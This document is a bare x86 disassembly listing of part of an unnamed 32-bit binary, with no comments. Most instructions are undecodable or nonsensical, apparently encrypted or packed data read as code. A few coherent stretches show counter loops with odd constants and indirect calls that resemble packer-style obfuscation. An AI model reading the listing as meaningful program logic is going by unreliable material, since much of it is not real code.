  402118:	jnp    0x4020eb
  40211a:	gs push esi
  40211c:	sub    esp,esi
  40211e:	push   eax
  40211f:	xchg   edx,eax
  402120:	push   edx
  402121:	pop    es
  402122:	push   esp
  402123:	add    DWORD PTR [ebp-0x57],eax
  402126:	ror    BYTE PTR [ebx+0x50],1
  402129:	dec    ecx
  40212a:	jne    0x4020f7
  40212c:	jae    0x402127
  40212e:	dec    ebx
  40212f:	jbe    0x402105
  402131:	iret   
  402132:	mov    ecx,0x3dbd0607
  402137:	or     DWORD PTR [ebx+0x5004f37b],0xffffffa8
  40213e:	neg    ecx
  402140:	dec    ebx
  402141:	inc    esp
  402142:	push   ecx
  402143:	sahf   
  402144:	mov    ecx,0xe4727e8f
  402149:	dec    ebp
  40214a:	lds    esp,FWORD PTR [edx-0x7b175ab9]
  402150:	aad    0x88
  402152:	mov    ecx,0x9c7056df
  402157:	pop    esi
  402158:	push   es
  402159:	sbb    bh,ah
  40215b:	xor    BYTE PTR [edi+0x567f972d],cl
  402161:	imul   ebp,DWORD PTR [esi-0x1b],0x1b
  402165:	push   esi
  402166:	xor    dl,ah
  402168:	das    
  402169:	hlt    
  40216a:	shr    BYTE PTR [ecx-0x21686583],1
  402170:	mov    edi,0x32358166
  402175:	add    DWORD PTR [ecx+0x39],0xa4b2d431
  40217c:	outs   dx,BYTE PTR ds:[esi]
  40217d:	nop
  40217e:	xchg   esi,eax
  40217f:	aam    0x13
  402181:	xchg   esp,eax
  402182:	mov    ds,WORD PTR [ecx+0x662bbe94]
  402188:	jle    0x4021e2
  40218a:	and    al,0x8b
  40218c:	pand   mm1,QWORD PTR [ecx]
  40218f:	daa    
  402190:	jmp    0xb8c15833
  402195:	inc    esp
  402196:	(bad)  
  402197:	loope  0x402150
  402199:	pop    esi
  40219a:	arpl   WORD PTR [eax-0x2876f15e],di
  4021a0:	test   BYTE PTR [edx+0x7],0xd7
  4021a4:	push   ss
  4021a5:	pop    esi
  4021a6:	mov    BYTE PTR [ebx],bl
  4021a8:	loop   0x40221d
  4021aa:	mov    edx,0xa190c220
  4021af:	cli    
  4021b0:	stos   DWORD PTR es:[edi],eax
  4021b1:	daa    
  4021b2:	mov    bh,0xc7
  4021b4:	(bad)  
  4021b5:	xor    eax,0x855a011f
  4021ba:	pusha  
  4021bb:	(bad)  
  4021bd:	jo     0x40216a
  4021bf:	(bad)
  4021c2:	imul   ebx,DWORD PTR [eax+0x56628aaa],0x27b53796
  4021cc:	mov    ebx,0x9b466e2b
  4021d1:	out    0x54,eax
  4021d3:	sub    esi,ebp
  4021d5:	(bad)  
  4021d6:	push   edi
  4021d7:	push   ebp
  4021d8:	ret    
  4021d9:	inc    edx
  4021da:	mov    DWORD PTR [esi+0x29],ebp
  4021dd:	ret    
  4021de:	jne    0x4021e0
  4021e0:	loop   0x4021b5
  4021e2:	fsubr  DWORD PTR [ecx]
  4021e4:	or     dl,BYTE PTR [edi]
  4021e6:	idiv   BYTE PTR [ecx]
  4021e8:	jmp    0x8a994928
  4021ed:	aas    
  4021ee:	mov    edx,0xfa7b7828
  4021f3:	xor    BYTE PTR [edi+edi*4+0x3d39a846],cl
  4021fa:	das    
  4021fb:	mov    ah,0x2f
  4021fd:	mov    al,0x64
  4021ff:	mov    dl,0xf5
  402201:	fisub  DWORD PTR [ecx+0xf4a0175]
  402207:	jne    0x4021d1
  402209:	push   cs
  40220a:	fwait
  40220b:	xchg   ecx,eax
  40220c:	ins    BYTE PTR es:[edi],dx
  40220d:	inc    ebp
  40220e:	dec    edi
  40220f:	cmp    eax,0xbd7065cb
  402214:	out    0xcf,al
  402216:	pop    edx
  402217:	jo     0x402260
  402219:	push   edx
  40221a:	pusha  
  40221b:	cmp    bh,BYTE PTR [edx+0x1c]
  40221e:	mov    dh,0x61
  402220:	stos   BYTE PTR es:[edi],al
  402221:	loope  0x4021fd
  402223:	fstp   DWORD PTR [ecx-0x2b48a9c6]
  402229:	daa    
  40222a:	push   eax
  40222b:	bound  ebp,QWORD PTR [ecx+ebp*1]
  40222e:	push   ebp
  40222f:	repz imul ebx,eax,0x2222695d
  402236:	ja     0x402291
  402238:	sub    al,0x2e
  40223a:	xchg   esi,eax
  40223b:	inc    ebx
  40223c:	push   ss
  40223d:	sbb    ebp,DWORD PTR [edi+edx*4-0x10]
  402241:	mov    ebx,edi
  402243:	push   eax
  402244:	push   eax
  402245:	(bad)  
  402246:	mov    ds:0x3b916c7b,eax
  40224b:	shr    BYTE PTR [eax],1
  40224d:	xchg   ecx,eax
  40224e:	jb     0x402249
  402250:	cli    
  402251:	push   0xffffffd5
  402253:	inc    ebx
  402254:	nop
  402255:	test   al,0x6a
  402257:	dec    ebx
  402258:	mov    al,ds:0x250a9ce6
  40225d:	addr16 pop esp
  40225f:	push   ds
  402260:	push   edi
  402261:	mov    ebx,0x1322afed
  402266:	xor    ch,ah
  402268:	jnp    0x4022b6
  40226a:	and    al,0x2a
  40226c:	daa    
  40226d:	je     0x40226a
  40226f:	(bad)  
  402270:	and    DWORD PTR fs:[ecx+0x33f1c89e],ecx
  402277:	jge    0x4021f9
  402279:	cmp    BYTE PTR [ebp-0x1],ch
  40227c:	jge    0x402204
  40227e:	mov    edi,0x6d2eaf50
  402283:	fidivr DWORD PTR [ebx]
  402285:	ret    
  402286:	mov    ebx,0xb8bca72d
  40228b:	xor    esi,DWORD PTR [edx+0x7e]
  40228e:	cli    
  40228f:	adc    ecx,DWORD PTR [ebp*2+0xe690776]
  402296:	and    ebp,DWORD PTR [ebp-0x3584cc37]
  40229c:	aad    0xc4
  40229e:	xchg   esp,eax
  40229f:	outs   dx,BYTE PTR ds:[esi]
  4022a1:	jmp    0x4022c2
  4022a3:	in     al,dx
  4022a4:	xchg   esp,eax
  4022a5:	cdq    
  4022a6:	es loop 0x4022bf
  4022a9:	mov    ds:0x865cde54,eax
  4022ae:	iret   
  4022af:	push   esi
  4022b0:	add    al,0x52
  4022b2:	les    esi,FWORD PTR [esi-0x766f120]
  4022b8:	pop    ecx
  4022b9:	inc    ebp
  4022ba:	or     al,0x86
  4022bc:	sbb    DWORD PTR [eax],esp
  4022be:	pop    esi
  4022bf:	call   0xa7d5:0xc4903345
  4022c6:	clc    
  4022c7:	sti    
  4022c8:	ds sti 
  4022ca:	push   0xef258151
  4022cf:	in     eax,dx
  4022d0:	inc    edx
  4022d1:	add    BYTE PTR [eax],al
  4022d3:	add    BYTE PTR [eax],al
  4022d5:	add    BYTE PTR [ebx+0x42edef15],cl
  4022db:	add    BYTE PTR [edx-0x77],al
  4022de:	adc    eax,0x42edef
  4022e3:	cmp    DWORD PTR ds:0x42edef,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e9bf
  4022fe:	cmp    DWORD PTR ds:0x42edef,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x430441,0x1f
  402315:	cmp    DWORD PTR ds:0x430441,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x430441,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e9af
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x430441
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x430441,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	repz js 0x4023b7
  402364:	jg     0x402341
  402366:	add    edi,DWORD PTR [esi+0x7e]
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x4023cf
  40236e:	cdq    
  40236f:	or     al,0xe7
  402371:	jmp    0xb532:0xe7caacfe
  402378:	mov    ah,0x76
  40237a:	jge    0x40239f
  40237c:	out    dx,eax
  40237d:	test   BYTE PTR [eax+0x5a],dh
  402380:	loopne 0x402319
  402382:	popf   
  402383:	mov    dh,0xa7
  402385:	xchg   ebx,eax
  402386:	jb     0x40235a
  402388:	jnp    0x402310
  40238a:	xchg   esi,eax
  40238b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40238c:	sub    cl,ch
  40238e:	int    0x4f
  402390:	(bad)  
  402391:	mov    bl,0xe6
  402393:	push   0x6b
  402395:	adc    ebx,edx
  402397:	xchg   DWORD PTR [ecx-0x49485e31],ebx
  40239d:	and    al,0x4c
  40239f:	outs   dx,BYTE PTR ds:[esi]
  4023a0:	and    DWORD PTR [edx+esi*2-0x5a],esi
  4023a4:	test   al,0xfb
  4023a6:	test   BYTE PTR ds:0xb831f596,dh
  4023ac:	push   esi
  4023ad:	vpavgb xmm0,xmm2,XMMWORD PTR [edi+0x43]
  4023b2:	adc    bl,bl
  4023b4:	cmc    
  4023b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023b6:	cld    
  4023b7:	cmp    DWORD PTR [ebx+0x24],ebx
  4023ba:	xor    BYTE PTR [edi+0x9],0x5a
  4023be:	lock dec edx
  4023c0:	sbb    al,0x82
  4023c2:	lods   al,BYTE PTR ds:[esi]
  4023c3:	jp     0x4023d7
  4023c5:	push   ds
  4023c6:	ret    0xb80b
  4023c9:	pushw  ss
  4023cb:	jmp    0x7ab77ba3
  4023d0:	loop   0x402367
  4023d2:	mov    dh,0xb6
  4023d4:	push   ecx
  4023d5:	test   DWORD PTR [edi],esi
  4023d7:	cmp    ebp,edx
  4023d9:	dec    ebx
  4023da:	out    0x5,al
  4023dc:	cvttps2pi mm7,QWORD PTR [ebp+edi*4+0x3e]
  4023e1:	push   ecx
  4023e2:	je     0x4023bc
  4023e4:	xchg   ebp,eax
  4023e5:	xchg   ecx,eax
  4023e6:	xchg   edx,eax
  4023e7:	inc    esi
  4023e8:	cli    
  4023e9:	sub    ebx,DWORD PTR [ebp-0x4c0c4278]
  4023ef:	push   ebp
  4023f0:	push   ss
  4023f1:	repz icebp 
  4023f3:	xchg   edx,eax
  4023f4:	aad    0xb3
  4023f6:	movhps xmm7,QWORD PTR [eax+edi*4-0x7f]
  4023fb:	mov    es,WORD PTR [edx+eax*8]
  4023fe:	out    0xb,eax
  402400:	xchg   ebp,eax
  402401:	or     bl,BYTE PTR [ebp-0x25]
  402404:	pop    esp
  402405:	fistp  WORD PTR [ecx-0x56979713]
  40240b:	loopne 0x402444
  40240d:	pop    ebx
  40240e:	fdiv   st(3),st
  402410:	pop    edx
  402411:	repz es push edx
  402414:	sahf   
  402415:	sbb    BYTE PTR [edi+0xf],ch
  402418:	cmp    ch,dh
  40241a:	jge    0x4023fa
  40241c:	mov    ch,0xa2
  40241e:	iret   
  40241f:	aam    0x1e
  402421:	ror    esi,cl
  402423:	dec    eax
  402424:	jae    0x402430
  402426:	mov    al,ds:0xc1e43ff5
  40242b:	cmp    al,0x24
  40242d:	bound  ebp,QWORD PTR [esi-0x6d]
  402430:	(bad)  
  402431:	mov    ch,0x4f
  402433:	pushf  
  402434:	or     cl,ah
  402436:	mov    dh,BYTE PTR [edi+0x5c]
  402439:	inc    ebx
  40243a:	pop    es
  40243b:	cmp    al,0xd7
  40243d:	shl    DWORD PTR [esi],1
  40243f:	(bad)
  402442:	test   eax,0xac5c9ce5
  402447:	jmp    0x402433
  402449:	jp     0x402460
  40244b:	push   esi
  40244c:	hlt    
  40244d:	mov    ebp,0x6c155c80
  402452:	test   al,0x67
  402454:	(bad)  
  402456:	in     eax,dx
  402457:	dec    ecx
  402458:	loope  0x40240f
  40245a:	mov    al,ds:0x13fa28bb
  40245f:	sub    ch,ah
  402461:	fisubr DWORD PTR [edi+0xb]
  402464:	sub    eax,0x10d3313f
  402469:	mov    esp,0xd91395e5
  40246e:	fmul   QWORD PTR [edi-0x6d97b672]
  402474:	xchg   DWORD PTR [esi+ebp*2],ecx
  402477:	pop    eax
  402478:	xchg   BYTE PTR [eax+0x715537e3],bh
  40247e:	in     eax,0xbd
  402480:	fiadd  WORD PTR [esi]
  402482:	das    
  402483:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402486:	imul   esi,DWORD PTR [eax+0x66],0xffffff9a
  40248a:	cld    
  40248b:	iret   
  40248c:	sub    eax,0x836b708e
  402491:	stc    
  402492:	mov    fs,WORD PTR [esi+esi*8+0x21]
  402496:	pop    ecx
  402497:	ret    0x44af
  40249a:	stos   BYTE PTR es:[edi],al
  40249b:	dec    esp
  40249c:	into   
  40249d:	add    DWORD PTR [edi+0xc787d65],eax
  4024a3:	neg    BYTE PTR [ebx]
  4024a5:	daa    
  4024a6:	enter  0xc2ce,0xd7
  4024aa:	jp     0x4024e4
  4024ac:	xor    edi,DWORD PTR [eax+0x3b]
  4024af:	fistp  QWORD PTR [eax-0x6af5b82b]
  4024b5:	pusha  
  4024b6:	mov    ecx,0x6b3390ad
  4024bb:	ret    
  4024bc:	mov    bp,0xb9e2
  4024c0:	cld    
  4024c1:	sub    al,0xe1
  4024c3:	imul   ebx,esp,0x76
  4024c6:	xchg   cl,bh
  4024c8:	pop    ss
  4024c9:	xor    bh,BYTE PTR [esi-0x42]
  4024cc:	sbb    ecx,DWORD PTR [esi]
  4024ce:	push   0xffffffd8
  4024d0:	add    BYTE PTR ds:0x63832ad5,dl
  4024d6:	xor    eax,0x11bb5ef3
  4024db:	fstp   st(1)
  4024dd:	add    al,0xa3
  4024df:	mov    al,ds:0x6a938e35
  4024e4:	xchg   ebx,eax
  4024e5:	xlat   BYTE PTR ds:[ebx]
  4024e6:	popa   
  4024e7:	(bad)  
  4024e8:	call   DWORD PTR [eax]
  4024ea:	mov    esp,0x49373e57
  4024ef:	push   0xa0833ce0
  4024f4:	nop
  4024f5:	test   DWORD PTR [eax],ecx
  4024f7:	mov    WORD PTR [esi],?
  4024f9:	pop    edi
  4024fa:	adc    ch,BYTE PTR [esi+ebx*8+0x32]
  4024fe:	and    edi,edi
  402500:	(bad)  
  402501:	imul   eax,DWORD PTR [eax-0x4e06b81e],0xc2544bb1
  40250b:	stos   BYTE PTR es:[edi],al
  40250c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40250d:	fstp   TBYTE PTR [edi]
  40250f:	push   ds
  402510:	std    
  402511:	adc    eax,0x6e295e63
  402516:	jl     0x4024f4
  402518:	call   0x5c8:0x4c4bc56d
  40251f:	mov    DWORD PTR [edx+0x719721b2],esp
  402525:	sbb    esp,DWORD PTR [ecx-0x2afaf111]
  40252b:	cs and eax,0x110d6e2
  402531:	or     DWORD PTR [esi+esi*2+0x57],ebx
  402535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402536:	inc    esi
  402537:	fs (bad) 
  402539:	rcr    DWORD PTR [edi-0xa],cl
  40253c:	cwde   
  40253d:	imul   esi,ebp,0xffffffff
  402540:	add    dl,ch
  402542:	shl    BYTE PTR [edi-0x641062ae],cl
  402548:	push   ecx
  402549:	and    DWORD PTR ds:0x42edcb,0x3339
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42edf3
  40255f:	xor    edx,DWORD PTR ds:0x42edcf
  402565:	mov    DWORD PTR ds:0x42edf3,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x430465,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x430445
  402592:	and    DWORD PTR ds:0x42edd7,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x4304cf,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x4304cf
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x4304cf,esi
  4025b8:	cmp    DWORD PTR ds:0x4304cf,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x4304cf,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e846
  4025d7:	call   DWORD PTR ds:0x42e9c3
  4025dd:	cmp    DWORD PTR ds:0x4304cf,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x4304cf
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x4304cf,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs jp  0x40265d
  402614:	pop    ebx
  402615:	sbb    DWORD PTR [esi],edi
  402617:	add    DWORD PTR [esi+0x7e],edi
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x402684
  40261f:	shl    DWORD PTR [ecx],cl
  402621:	jae    0x4025ae
  402623:	(bad)  ds:0x891fd8a0
  402629:	adc    DWORD PTR ds:0x4cdf5c71,esp
  40262f:	jle    0x40265d
  402631:	test   al,0x33
  402633:	push   ds
  402634:	das    
  402635:	inc    ebx
  402636:	mov    bh,0xce
  402638:	jle    0x4025cb
  40263a:	std    
  40263b:	or     al,al
  40263d:	add    eax,0x12e7ad15
  402642:	sub    BYTE PTR [ecx-0x4167992b],al
  402648:	xchg   ecx,eax
  402649:	pmaddwd mm3,QWORD PTR ds:0xc9cae0e0
  402650:	push   ebp
  402651:	test   BYTE PTR [edx+0x2c75b0f6],dl
  402657:	xchg   edi,edx
  402659:	ror    BYTE PTR [edx+0x75d806a],1
  40265f:	and    BYTE PTR [ebp-0x66],dl
  402662:	mov    dl,0x0
  402664:	sub    al,0x46
  402666:	ss out dx,al
  402668:	lds    edi,FWORD PTR [esi+0x32cbb79]
  40266e:	adc    edi,DWORD PTR [edi]
  402670:	xchg   DWORD PTR ds:0xbd9c738b,esi
  402676:	push   0x78
  402678:	cmp    ch,BYTE PTR [ebp+0x36]
  40267b:	clc    
  40267c:	xchg   DWORD PTR [ecx+0x9194ab0],ebp
  402682:	and    BYTE PTR [esi+edi*1+0x1dfbcae5],0xa6
  40268a:	pop    ds
  40268b:	daa    
  40268c:	or     edx,DWORD PTR [esi]
  40268e:	push   ebp
  40268f:	inc    ebp
  402690:	xor    eax,0xba44d907
  402695:	and    eax,0x82ae37e7
  40269a:	xor    al,0x3d
  40269c:	enter  0xed07,0x57
  4026a0:	xor    DWORD PTR [esi+edx*2+0x7f],ebx
  4026a4:	xor    DWORD PTR [eax],ebp
  4026a6:	mov    cl,BYTE PTR [ecx-0x8366324]
  4026ac:	stos   DWORD PTR es:[edi],eax
  4026ad:	mov    esp,0xf20d20b1
  4026b2:	mov    ebx,0x903cdc9b
  4026b7:	inc    esp
  4026b8:	test   BYTE PTR [edi+0x493f530b],ah
  4026be:	imul   edx,DWORD PTR [ecx],0x2
  4026c1:	ins    DWORD PTR es:[edi],dx
  4026c2:	adc    ah,BYTE PTR [esi+0x8007e5]
  4026c8:	sub    BYTE PTR [ebx+0x2f2e0773],0x6c
  4026cf:	ds loopne 0x4026dd
  4026d2:	icebp  
  4026d3:	dec    esp
  4026d4:	int    0x14
  4026d6:	xchg   ebp,eax
  4026d7:	mov    ebp,0x988131b5
  4026dc:	test   al,0x1
  4026de:	and    ch,BYTE PTR [eax]
  4026e0:	adc    DWORD PTR [esi+0x400ee9cf],esp
  4026e6:	dec    esi
  4026e7:	pop    ss
  4026e8:	out    dx,eax
  4026e9:	sbb    dh,bl
  4026eb:	pop    edi
  4026ec:	xchg   ebp,eax
  4026ed:	ror    DWORD PTR [ebx+0x678304c7],1
  4026f3:	clc    
  4026f4:	enter  0x570c,0xa1
  4026f8:	mov    eax,0x37780e06
  4026fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026fe:	int    0x22
  402700:	in     eax,dx
  402701:	rcl    DWORD PTR [ebp-0x3c],cl
  402704:	leave  
  402705:	add    al,BYTE PTR cs:[ebp+ecx*2-0x77]
  40270a:	or     al,0x15
  40270c:	ss jns 0x402765
  40270f:	xchg   ebx,eax
  402710:	js     0x4026d4
  402712:	ret    
  402713:	add    cl,dh
  402715:	and    DWORD PTR ds:0x977c04c0,ebp
  40271b:	mov    ebx,0xdfc1a5a9
  402720:	jnp    0x40274d
  402722:	push   eax
  402723:	push   ss
  402724:	ror    BYTE PTR [eax-0x45327794],0x49
  40272b:	jle    0x4026c8
  40272d:	mov    ebp,0x668ec773
  402732:	gs jo  0x40272f
  402735:	jno    0x402748
  402737:	add    ecx,eax
  402739:	or     bh,BYTE PTR [eax+0x2f19bcfe]
  40273f:	or     DWORD PTR [ecx+0x38],esi
  402742:	dec    esp
  402743:	sahf   
  402744:	mov    BYTE PTR [ebp-0x5c],bh
  402747:	test   DWORD PTR [ebx+0xb0596b6],eax
  40274d:	dec    edx
  40274e:	mov    ds:0xf8dadbd9,al
  402753:	xor    BYTE PTR [eax+0x19],bl
  402756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402757:	pushf  
  402758:	push   edx
  402759:	lods   eax,DWORD PTR ds:[esi]
  40275a:	imul   esp,DWORD PTR [eax],0xd99647ca
  402760:	leave  
  402761:	jne    0x40271d
  402763:	adc    BYTE PTR [eax+0x7],al
  402766:	xor    esi,ebx
  402768:	xchg   DWORD PTR [eax],edx
  40276a:	mov    ds:0x116aa1d8,al
  40276f:	rol    BYTE PTR [ebp+edx*1+0x63868d21],cl
  402776:	mov    esp,0x2c764319
  40277b:	push   cs
  40277c:	adc    DWORD PTR [ecx],esp
  40277e:	pop    edi
  40277f:	adc    ebp,DWORD PTR [esp+edx*1-0x54]
  402783:	xor    BYTE PTR [ebx-0x71],bl
  402786:	gs nop
  402788:	or     ch,BYTE PTR [eax]
  40278a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40278b:	cdq    
  40278c:	adc    BYTE PTR [esi-0x1e],bh
  40278f:	or     ecx,DWORD PTR [esi+0x17]
  402792:	stos   DWORD PTR es:[edi],eax
  402793:	mov    eax,0x111dd318
  402798:	pushf  
  402799:	mov    edi,edx
  40279b:	les    ebp,FWORD PTR [ebp+edx*1+0x2b]
  40279f:	or     BYTE PTR [ecx+0x93ba1c5],cl
  4027a5:	pop    ebx
  4027a6:	and    bl,BYTE PTR [esi+0x3ae547e7]
  4027ac:	and    al,0x6c
  4027ae:	in     eax,0x69
  4027b0:	xor    eax,0x5a6480e8
  4027b5:	mov    ds:0x5c54255d,eax
  4027ba:	pop    edi
  4027bb:	adc    al,0xab
  4027bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027be:	jg     0x4027af
  4027c0:	in     al,0x6d
  4027c2:	mov    edx,0xfb5ffe37
  4027c7:	jns    0x4027ca
  4027c9:	adc    DWORD PTR [ecx-0x3614bbe3],ebx
  4027cf:	xchg   DWORD PTR [edi+0x76],ebp
  4027d2:	lods   al,BYTE PTR ds:[esi]
  4027d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027d4:	imul   ebp,DWORD PTR [ebx],0x6890fd84
  4027da:	push   ds
  4027db:	lods   eax,DWORD PTR ds:[esi]
  4027dc:	inc    edx
  4027dd:	icebp  
  4027de:	nop
  4027df:	xchg   edx,eax
  4027e0:	xchg   edi,eax
  4027e1:	je     0x402849
  4027e3:	outs   dx,DWORD PTR ds:[esi]
  4027e4:	dec    ebp
  4027e5:	add    al,0x8d
  4027e7:	ins    BYTE PTR es:[edi],dx
  4027e8:	jl     0x402796
  4027ea:	scas   al,BYTE PTR es:[edi]
  4027eb:	outs   dx,DWORD PTR ds:[esi]
  4027ec:	pop    DWORD PTR [esi]
  4027ee:	jo     0x402815
  4027f0:	and    BYTE PTR ds:0xc541e7b3,ch
  4027f6:	sub    al,0xf4
  4027f8:	mov    edi,0x107d8b57
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    DWORD PTR [edi],edx
  402828:	sti    
  402829:	adc    DWORD PTR [ecx+0x7e7e0f15],esi
  40282f:	push   ebp
  402830:	jg     0x4028b0
  402832:	jle    0x4027c6
  402834:	mov    cl,0x7c
  402836:	pusha  
  402837:	lods   eax,DWORD PTR ds:[esi]
  402838:	inc    esp
  402839:	push   eax
  40283a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40283b:	daa    
  40283c:	int    0xee
  40283e:	mov    edx,0x662cce4c
  402843:	jle    0x402874
  402845:	mov    bl,0xb
  402847:	daa    
  402848:	xor    esi,DWORD PTR [ebx+ecx*1]
  40284b:	pop    esi
  40284c:	lea    ebx,[edi+0x2bbc6655]
  402852:	jmp    0xdccdd5db
  402857:	je     0x402804
  402859:	push   cs
  40285a:	cmp    DWORD PTR [eax-0x2c],esi
  40285d:	repz dec esi
  40285f:	repz push cs
  402861:	rcr    al,cl
  402863:	inc    DWORD PTR ds:0xaf46abd5
  402869:	mov    WORD PTR [eax-0x6b],fs
  40286c:	addr16 into 
  40286e:	retf   0x8db5
  402871:	push   edx
  402872:	pop    edi
  402873:	sub    eax,0x9fcda9af
  402878:	retf   
  402879:	ins    BYTE PTR es:[edi],dx
  40287a:	stos   DWORD PTR es:[edi],eax
  40287b:	arpl   WORD PTR [edi],bx
  40287d:	mov    ds:0x268037b4,al
  402882:	les    edi,FWORD PTR [esi-0x5f6f2dfc]
  402888:	sub    al,0x57
  40288a:	and    DWORD PTR [eax+edi*4+0x39],ecx
  40288e:	adc    cl,BYTE PTR [edx+0x5b3bce0b]
  402894:	pop    DWORD PTR [edx-0x37ac0438]
  40289a:	pop    edi
  40289b:	adc    al,0x4
  40289d:	test   al,0x2c
  40289f:	dec    edx
  4028a0:	lahf   
  4028a1:	test   eax,0x82ace337
  4028a6:	sbb    ecx,DWORD PTR [esi]
  4028a8:	jmp    0x4028ca
  4028aa:	neg    BYTE PTR [ebx]
  4028ac:	adc    edx,DWORD PTR ds:0x16de114b
  4028b2:	jb     0x402875
  4028b4:	cdq    
  4028b5:	jmp    0x4b69:0x8e360c4f
  4028bc:	or     ebp,DWORD PTR ds:0xcec9203c
  4028c2:	data16 aad 0xc
  4028c5:	and    bl,al
  4028c7:	sub    eax,DWORD PTR [ebp+0x17a8d891]
  4028cd:	xchg   edx,eax
  4028ce:	jmp    0x802cffd5
  4028d3:	sub    edi,ebx
  4028d5:	in     al,0xb0
  4028d7:	dec    ecx
  4028d8:	add    eax,0xed1f2fbe
  4028dd:	add    DWORD PTR [esi+ecx*8],esp
  4028e0:	sbb    bh,ch
  4028e2:	xchg   edi,eax
  4028e3:	push   ecx
  4028e4:	and    al,0x6f
  4028e6:	add    cl,al
  4028e8:	shr    esp,1
  4028ea:	mov    dh,0xb7
  4028ec:	mov    dl,0x6d
  4028ee:	push   edi
  4028ef:	adc    BYTE PTR [ecx],bh
  4028f1:	add    al,0x8a
  4028f3:	sti    
  4028f4:	inc    edi
  4028f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028f6:	push   eax
  4028f7:	pusha  
  4028f8:	inc    eax
  4028f9:	sbb    eax,0x54150dc0
  4028fe:	dec    eax
  4028ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402900:	jl     0x40290f
  402902:	clc    
  402903:	push   0xffffff9e
  402905:	ficom  DWORD PTR [ebx+0x2e]
  402908:	xchg   edx,eax
  402909:	push   ds
  40290a:	loop   0x402972
  40290c:	mov    dh,0x75
  40290e:	mov    cl,BYTE PTR [eax]
  402910:	rcl    DWORD PTR [eax-0x5e],1
  402913:	push   cs
  402914:	push   edi
  402915:	rcl    edx,1
  402917:	jmp    0x87a437c1
  40291c:	jecxz  0x40297e
  40291e:	popa   
  40291f:	(bad)
  402922:	dec    edi
  402923:	nop
  402924:	mov    cl,0x1b
  402926:	into   
  402927:	mov    ebp,0x139b3ede
  40292c:	mov    bh,0xc6
  40292e:	xor    ecx,esp
  402930:	sub    edi,DWORD PTR [eax-0x250f9358]
  402936:	pop    eax
  402937:	sbb    dh,BYTE PTR [edi]
  402939:	sbb    esp,DWORD PTR es:[ecx]
  40293c:	add    bl,BYTE PTR [ebp+esi*8-0x117766c1]
  402943:	js     0x402942
  402945:	inc    ebx
  402946:	je     0x402978
  402948:	adc    DWORD PTR [edx-0x35],ebx
  40294b:	mov    ebp,0xfd83ec08
  402950:	js     0x4028da
  402952:	jmp    0x113128b5
  402957:	or     BYTE PTR [ebx+0x59141c27],0x73
  40295e:	mov    ah,0xce
  402960:	adc    eax,0xf27fa043
  402965:	cmp    ecx,ebx
  402967:	inc    esi
  402968:	sub    eax,0x6bbf7e19
  40296d:	add    al,0x3e
  40296f:	inc    edi
  402970:	adc    esp,DWORD PTR [eax-0x1114c8f1]
  402976:	lock inc edi
  402978:	mov    eax,0x8b6e888c
  40297d:	inc    esi
  40297e:	jbe    0x402975
  402980:	xchg   ecx,eax
  402981:	daa    
  402982:	in     eax,0x7c
  402984:	jmp    0x7d4aebb3
